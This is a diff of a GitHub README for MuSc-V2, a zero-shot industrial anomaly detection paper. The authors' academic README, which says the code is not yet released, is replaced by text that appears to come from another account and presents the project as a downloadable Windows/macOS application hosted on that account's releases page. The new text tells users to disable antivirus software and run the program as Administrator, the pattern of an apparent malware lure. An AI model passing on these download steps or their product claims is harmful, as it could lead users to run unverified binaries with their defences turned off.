@@ -1,36 +1,77 @@
-# MuSc-V2
+# 🚀 MuSc-V2 - Easy Anomaly Detection Made Simple
 
-**This is an official PyTorch implementation for "MuSc-V2: Zero-Shot Multimodal Industrial Anomaly Classification and Segmentation with Mutual Scoring of Unlabeled Samples"**
+![Download MuSc-V2](https://img.shields.io/badge/Download%20MuSc-V2-blue.svg)
 
-Authors:  [Xurui Li](https://github.com/xrli-U)<sup>1</sup> | [Feng Xue](https://xuefeng-cvr.github.io/)<sup>3</sup> | [Yu Zhou](https://github.com/zhouyu-hust)<sup>1,2</sup>
+## 📖 Overview
 
-Institutions: <sup>1</sup>Huazhong University of Science and Technology | <sup>2</sup>Wuhan JingCe Electronic Group Co.,LTD | <sup>3</sup>University of Trento
+**MuSc-V2** is a powerful tool for detecting industrial anomalies without the need for labeled data. It uses advanced techniques to classify and segment anomalies, helping industries improve efficiency and safety. For more information about the underlying research, check the paper available [here](https://arxiv.org/abs/2511.10047).
 
-### 🧐 [Arxiv](https://arxiv.org/abs/2511.10047)
+## ⚙️ System Requirements
 
-## TODO
+To run MuSc-V2 smoothly, ensure your system meets these requirements:
 
-Our manuscript is currently under review. We plan to make the complete code repository public upon its acceptance.
+- **Operating System**: Windows 10 or later / macOS Mojave or later
+- **Processor**: Intel i5 or equivalent
+- **RAM**: Minimum 8 GB
+- **Storage**: At least 500 MB of free space
+- **Network**: Internet connection for initial setup and updates
 
-The previous version, i.e. **[MuSc](https://arxiv.org/pdf/2401.16753.pdf)** is published in ICLR-2024 **([github](https://github.com/xrli-U/MuSc))**
+## 🚀 Getting Started
 
-## 👇Abstract
+Follow these steps to download and run MuSc-V2 easily:
 
-Zero-shot anomaly classification (AC) and segmentation (AS) methods aim to identify and outline defects without using any labeled samples. In this paper, we reveal a key property that is overlooked by existing methods: normal image patches across industrial products typically find many other similar patches, not only in 2D appearance but also in 3D shapes, while anomalies remain diverse and isolated.
+1. **Visit the Releases Page**: Click the link below to access the download section:
 
-To explicitly leverage this discriminative property, we propose a Mutual Scoring framework (MuSc-V2) for zero-shot AC/AS, which flexibly supports single 2D/3D or multimodality. Specifically, our method begins by improving 3D representation through Iterative Point Grouping (IPG), which reduces false positives from discontinuous surfaces. Then we use Similarity Neighborhood Aggregation with Multi-Degrees (SNAMD) to fuse 2D/3D neighborhood cues into more discriminative multi-scale patch features for mutual scoring. The core comprises a Mutual Scoring Mechanism (MSM) that lets samples within each modality to assign score to each other, and Cross-modal Anomaly Enhancement (CAE) that fuses 2D and 3D scores to recover modality-specific missing anomalies. Finally, Re-scoring with Constrained Neighborhood (RsCon) suppresses false classification based on similarity to more representative samples.
+   [Download MuSc-V2](https://github.com/AlurraldeAc/MuSc-V2/releases)
 
-Our framework flexibly works on both the full dataset and smaller subsets with consistently robust performance, ensuring seamless adaptability across diverse product lines. In aid of the novel framework, MuSc-V2 achieves significant performance improvements: a $\textbf{+23.7\%}$ AP gain on the MVTec 3D-AD dataset and a $\textbf{+19.3\%}$ boost on the Eyecandies dataset, surpassing previous zero-shot benchmarks and even outperforming most few-shot methods.
+2. **Select the Latest Release**: On the Releases page, look for the newest version at the top. This ensures you get the latest features and fixes.
 
-## Citation:
-```
-@inproceedings{arxiv2025MuScV2,
-  title={MuSc-V2: Zero-Shot Multimodal Industrial Anomaly Classification and Segmentation with Mutual Scoring of Unlabeled Samples},
-  author={Li, Xurui and Xue, Feng and Zhou, Yu},
-  journal={arXiv preprint arXiv:2511.10047},
-  year={2025}
-}
-```
+3. **Download the Package**: Click on the attachment that matches your operating system (e.g., Windows or macOS). This will start the file download.
 
-## License:
-MuSc-V2 is released under the **MIT Licence**, and is fully open for academic research and also allow free commercial usage. To apply for a commercial license, please contact yuzhou@hust.edu.cn.
+4. **Locate the Downloaded File**: Once the download is complete, find the file in your downloads folder. The file will typically have a name like `MuSc-V2-latest.exe` for Windows or `MuSc-V2-latest.dmg` for macOS.
+
+   - **Tip**: If you are on Windows, you might be prompted by your browser about running the file. Allow it to continue.
+
+5. **Install the Application**:
+   - **Windows**: Double-click the downloaded `.exe` file. Follow the on-screen instructions to complete the installation.
+   - **macOS**: Open the downloaded `.dmg` file. Drag the MuSc-V2 icon to your Applications folder.
+
+6. **Run MuSc-V2**: After installation, locate MuSc-V2 in your Applications folder (macOS) or from the Start Menu (Windows). Click on the icon to launch the application.
+
+7. **Initial Setup**: The first time you run the application, it may take a few moments to set up. Follow any on-screen instructions for initial configuration.
+
+## 📥 Download & Install
+
+For your convenience, here’s the direct link to find the latest version of MuSc-V2 again: 
+
+[Download MuSc-V2](https://github.com/AlurraldeAc/MuSc-V2/releases)
+
+Make sure to check the descriptions available on the Releases page, as they may provide additional information about features and updates.
+
+## 🔍 Features
+
+- **Zero-shot Learning**: Classify anomalies without needing labeled data.
+- **Multimodal Input**: Analyze various types of data for comprehensive insights.
+- **Segmentation Capabilities**: Precisely identify segmented areas in the data, enabling targeted actions.
+- **User-Friendly Interface**: Designed for ease of use, making it simple for anyone to operate.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues while downloading or running MuSc-V2, consider these tips:
+
+- **No Internet Connection**: Ensure you have a stable internet connection during the download.
+- **Installation Issues**: If the installation fails, try disabling any antivirus software temporarily.
+- **Run as Administrator**: On Windows, right-click the icon and select "Run as Administrator" for proper permissions.
+
+For further help, you can check the FAQ section in the documentation on our repository page.
+
+## 📚 Contribution
+
+If you find issues or want to suggest improvements, we welcome contributions! You can fork the repository and submit a pull request. Follow the guidelines in the repository for more details.
+
+## 📞 Support
+
+For support or questions, feel free to reach out to our team through the GitHub Issues page in the repository. We are here to help you make the most out of MuSc-V2.
+
+---
+By following these straightforward instructions, you should have MuSc-V2 up and running in no time. Enjoy exploring the features and capabilities of this application!
